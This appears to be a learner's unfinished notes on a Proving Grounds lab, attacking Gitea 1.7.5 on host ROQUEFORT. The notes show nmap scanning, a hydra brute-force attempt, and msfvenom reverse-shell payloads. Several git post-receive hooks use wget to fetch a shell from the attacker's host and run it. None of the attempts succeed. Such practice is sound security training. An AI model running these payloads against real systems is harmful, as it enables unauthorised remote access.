This lab explores exploiting an authenticated remote code execution vulnerability in Gitea 1.7.5 to gain initial access. Learners will use default writable permissions in /usr/local/bin to hijack the PATH variable and escalate privileges through a scheduled cron job. The lab emphasizes exploiting application vulnerabilities, enumerating system weaknesses, and leveraging misconfigured cron jobs for privilege escalation.


lets get crackalackin

192.168.52.67

/etc/hosts

21 ftp
22 ssh
2222 dropbear
3000 gitea

```
???(kali?kali)-[~]
??$ nmap -sV -sC -T4 -oA initial ROQUEFORT
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 16:28 +0000
Nmap scan report for ROQUEFORT (192.168.52.67)
Host is up (0.00064s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5b
22/tcp   open   ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:77:6f:b1:ed:65:b5:ad:14:64:40:d2:24:d3:9c:0d (RSA)
|   256 a9:b4:4f:61:2e:2d:9d:4c:48:15:fe:70:8e:fa:af:b3 (ECDSA)
|_  256 92:56:eb:af:c9:34:af:ea:a1:cf:9f:e1:90:dd:2f:61 (ED25519)
53/tcp   closed domain
2222/tcp open   ssh     Dropbear sshd 2016.74 (protocol 2.0)
3000/tcp open   http    Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=9daf8f209ee0acd4; Path=/; HttpOnly
|     Set-Cookie: _csrf=4BPp8d_ROH2g-icuTNRtOa_kuyU6MTc3NTU3OTMzNTc3ODE2OTQ2MA%3D%3D; Path=/; Expires=Wed, 08 Apr 2026 16:28:55 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 07 Apr 2026 16:28:55 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=b3bec3e6387fc367; Path=/; HttpOnly
|     Set-Cookie: _csrf=Xu7puV3JCWFol1toTxm0aatjY6k6MTc3NTU3OTMzNTgyMDM1ODc0Mw%3D%3D; Path=/; Expires=Wed, 08 Apr 2026 16:28:55 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 07 Apr 2026 16:28:55 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|_    navigator.serviceWorker.register('/serviceworker.js').then(function(registration

```

21 ftp
22 ssh
2222 dropbear
3000 gitea

```

POST /login

form-data
user_name=root
password=root
```

```bash
cewl --lowercase http://ROQUEFORT:3000/ | grep -v CeWL > words.txt

hydra -I -f -L words.txt -P words.txt "http-post-form://ROQUEFORT:3000/login:user_name=^USER^&password=^PASS^:F=403"
```

okay! so this is a rabbit hole.

https://medium.com/@vivek-kumar/offensive-security-proving-grounds-walk-through-roquefort-e61052190965

I need to search with `searchsploit Gitea`.

`49383`

we need to create a new account on ROQUEFORT gitea.

`hackme:hackme`

```bash
???(kali?kali)-[~]
??$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo 
       valid_lft forever preferred_lft forever
3: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:86:81:c1 brd ff:ff:ff:ff:ff:ff
    inet 192.168.49.52/24 brd 192.168.49.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::41f:8306:40e5:ca37/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever

```

```bash
ls /usr/share/exploitdb/exploits/multiple/webapps/49383.py
cp /usr/share/exploitdb/exploits/multiple/webapps/49383.py ./

msfvenom -p cmd/unix/reverse_bash LHOST=192.168.49.52 LPORT=4444 -f raw > reverse.sh

# in new terminal
nc -nvlp 4444

# in new terminal
python3 -m http.server 8080

# edit file 
code-oss 49383.py
```


```python
# contents of top of 49383.py

USERNAME = "hackme"
PASSWORD = "hackme"
HOST_ADDR = '192.168.52.67'
HOST_PORT = 3000
URL = 'http://192.168.52.67:3000'
CMD = 'wget http://192.168.49.52:8080/reverse.sh -O /tmp/reverse.sh && chmod 777 /tmp/reverse.sh && /tmp/reverse.sh'

```


we're using the wrong version.

Gitea Version: 1.7.5

wait, no. we are using the right version.

not sure why it fails.

```
???(kali?kali)-[~]
??$ python 49383.py   
Logging in
Logged in successfully
Retrieving user ID
Retrieved user ID: 1
hint: Using 'master' as the name for the initial branch. This default branch name
hint: will change to "main" in Git 3.0. To configure the initial branch name
hint: to use in all of your new repositories, which will suppress this warning,
hint: call:
hint:
hint:   git config --global init.defaultBranch <name>
hint:
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint:
hint:   git branch -m <name>
hint:
hint: Disable this message with "git config set advice.defaultBranchName false"
Initialized empty Git repository in /tmp/tmp5c8ou7c5/.git/
[master (root-commit) 2fd37cb] x
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 x
Cloning into bare repository '/tmp/tmp5c8ou7c5.git'...
done.
Created temporary git server to host /tmp/tmp5c8ou7c5.git
Creating repository
Repo "durkzwnp" created
Injecting command into repo
Error injecting command

```


manual approach:

```bash
# Set up environment
cd /tmp
rm -rf exploit.git exploitsrc

# Create bare repo with hook
mkdir exploit.git
cd exploit.git
git init --bare

# Create post-receive hook
cat > hooks/post-receive << 'EOF'
#!/bin/bash
wget http://192.168.49.52:8080/reverse.sh -O /tmp/r.sh
chmod +x /tmp/r.sh
/tmp/r.sh
EOF
chmod +x hooks/post-receive

# Create source repo with content
cd /tmp
mkdir exploitsrc
cd exploitsrc
git init
git config user.email "x@x.com"
git config user.name "x"
echo "test" > test.txt
git add .
git commit -m "init"

# Push to bare repo
git push /tmp/exploit.git master

# Mark for export
touch /tmp/exploit.git/git-daemon-export-ok

# Start git daemon with receive-pack enabled
git daemon --reuseaddr --base-path=/tmp --export-all --enable=receive-pack &

# Create repo on Gitea via API
curl -s -X POST "http://192.168.52.67:3000/api/v1/user/repos" \
  -u "hackme:hackme" \
  -H "Content-Type: application/json" \
  -d '{"name":"rce2","private":false}'

# Now the key step - push the bare repo to Gitea
cd /tmp/exploit.git
git remote add gitea "http://hackme:hackme@192.168.52.67:3000/hackme/rce2.git"
git push --mirror gitea

msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.52 LPORT=4444 -f elf -o /tmp/shell.elf

# In your python http.server terminal (kill the old one with Ctrl+C and restart, or just leave it running if it's already on 8080)
cd /tmp/ && python3 -m http.server 8080

# Make sure your listener is running
nc -nvlp 4444

# Trigger it
cd /tmp/exploitsrc
echo "binary" >> test.txt
git add .
git commit -m "binary"
git push gitea master
```

ok. ergh. trying a different approach.

```bash

# gen rev shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.52 LPORT=4444 -f elf -o /tmp/shell.elf

# start web server
python3 -m http.server 8080

# trigger commit
cd /tmp
rm -rf exploit.git

mkdir exploit.git
cd exploit.git
git init --bare

# Create the hook that downloads and runs our static binary
cat > hooks/post-receive << 'EOF'
#!/bin/sh
wget http://192.168.49.52:8080/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf &
EOF
chmod +x hooks/post-receive

# Mark it safe for the daemon
touch git-daemon-export-ok


## start git daemon
pkill git-daemon
git daemon --reuseaddr --base-path=/tmp --export-all --enable=receive-pack &

## create fresh git repo
curl -s -X POST "http://192.168.52.67:3000/api/v1/user/repos" \
  -u "hackme:hackme" \
  -H "Content-Type: application/json" \
  -d '{"name":"rce3","private":false}'
  
## start listener and push

# In a new terminal
nc -nvlp 4444

# In your main terminal
cd /tmp/exploit.git
git remote add gitea3 "http://hackme:hackme@192.168.52.67:3000/hackme/rce3.git"
git push --mirror gitea3
```


```bash

curl -s -X POST "http://192.168.52.67:3000/api/v1/user/repos" \
  -u "hackme:hackme" \
  -H "Content-Type: application/json" \
  -d '{"name":"final","private":false}'
```

### Step 4: Add the Hook via Web UI

1. Go to: `http://192.168.52.67:3000/hackme/final/settings/hooks/git`
2. Add a **`post-receive`** hook.
3. Paste this exactly (no `&`, just a simple chain):
```
wget http://192.168.49.52:8080/shell.elf -O /tmp/s.elf && chmod +x /tmp/s.elf && /tmp/s.elf
```

### Step 5: Catch the Shell & Trigger

```bash
# In a new terminal, start your listener
nc -nvlp 4444

# In another terminal, push to trigger the hook
cd /tmp/exploitsrc
git remote add final http://hackme:hackme@192.168.52.67:3000/hackme/final.git
git push final master
```

nope, it fails.

tempted to shelve this and come back to it later.

I must be missing something simple.